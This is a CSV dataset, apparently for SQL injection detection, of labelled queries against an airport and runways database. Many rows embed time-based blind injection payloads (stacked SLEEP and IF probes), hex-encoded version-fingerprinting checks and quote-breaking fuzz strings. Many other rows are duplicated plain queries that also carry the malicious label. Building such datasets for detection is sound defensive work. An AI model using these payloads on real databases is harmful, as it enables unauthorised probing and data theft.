full_query,label,template_id,malicious_input,malicious_input_desc
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((@@VERSION_COMMENT LIKE 0x25506572636f6e6125),SLEEP(1),6844)#"") OR name LIKE ""Laporte"");SELECT IF((@@VERSION_COMMENT LIKE 0x25506572636f6e6125),SLEEP(1),6844)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((AURORA_VERSION() LIKE 0x25),SLEEP(1),9659)#"") OR name LIKE ""Laporte"");SELECT IF((AURORA_VERSION() LIKE 0x25),SLEEP(1),9659)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((6972=6972/* NoValue */),SLEEP(1),6972)#"") OR name LIKE ""Laporte"");SELECT IF((6972=6972/* NoValue */),SLEEP(1),6972)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((3543=3543/*!80300 AND 4382=4913*/),SLEEP(1),3543)#"") OR name LIKE ""Laporte"");SELECT IF((3543=3543/*!80300 AND 4382=4913*/),SLEEP(1),3543)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Laporte"");SELECT IF((8115=8115/*!80302 AND 5001=4163*/),SLEEP(1),8115)#"") OR name LIKE ""Laporte"");SELECT IF((8115=8115/*!80302 AND 5001=4163*/),SLEEP(1),8115)#""",1,airport-S10,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US)))""(',)(("") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US'mmlxvw<'"">yQTcQM"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US');SELECT SLEEP(5)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US';SELECT SLEEP(5)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"";SELECT SLEEP(5)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US'));SELECT SLEEP(5)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US')));SELECT SLEEP(5)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US%';SELECT SLEEP(5)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT SLEEP(5)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT SLEEP(0)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT SLEEP(5)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((47=47),SLEEP(5),2777)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((47=52),SLEEP(5),9285)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((47=59),SLEEP(5),6489)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((59=52),SLEEP(5),2771)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((52=52),SLEEP(5),3378)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((59 52),SLEEP(5),2266)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((21=21),SLEEP(5),7427)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((21=58),SLEEP(5),1920)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((21=97),SLEEP(5),5673)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((97=58),SLEEP(5),6921)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((58=58),SLEEP(5),7402)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((97 58),SLEEP(5),5580)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((55=55),SLEEP(5),9214)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((55=68),SLEEP(5),6526)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((55=95),SLEEP(5),4711)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((95=68),SLEEP(5),3802)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((68=68),SLEEP(5),4404)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((95 68),SLEEP(5),8682)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((15=15),SLEEP(5),4674)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((15=39),SLEEP(5),2113)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((15=52),SLEEP(5),7086)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((52=39),SLEEP(5),4592)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((39=39),SLEEP(5),9640)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((52 39),SLEEP(5),4536)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((22=22),SLEEP(5),2352)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((22=34),SLEEP(5),3153)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((22=56),SLEEP(5),7427)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((56=34),SLEEP(5),2840)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((34=34),SLEEP(5),5325)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((56 34),SLEEP(5),7178)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((5188=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                5188),SLEEP(5),3711)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((6687>6686),SLEEP(5),8352)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((QUARTER(NULL XOR NULL) IS NULL),SLEEP(5),8845)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((SESSION_USER() LIKE USER()),SLEEP(5),5905)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((ISNULL(JSON_STORAGE_FREE(NULL))),SLEEP(5),2088)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((VERSION() LIKE 0x254d61726961444225),SLEEP(1),5408)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((VERSION() LIKE 0x255469444225),SLEEP(1),7992)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((@@VERSION_COMMENT LIKE 0x256472697a7a6c6525),SLEEP(1),1525)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((@@VERSION_COMMENT LIKE 0x25506572636f6e6125),SLEEP(1),5812)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((AURORA_VERSION() LIKE 0x25),SLEEP(1),2671)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((6611=6611/* NoValue */),SLEEP(1),6611)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((1752=1752/*!80300 AND 6501=4047*/),SLEEP(1),1752)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"");SELECT IF((7328=7328/*!80302 AND 7597=6206*/),SLEEP(1),7328)#"") OR a.elevation_ft > 270.0",1,airport-S11,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"",,'.(,,.."");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport'oEikfZ<'"">NWqbDE"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Bucks Airport"");",1,airport-S12,Unknown,Unknown
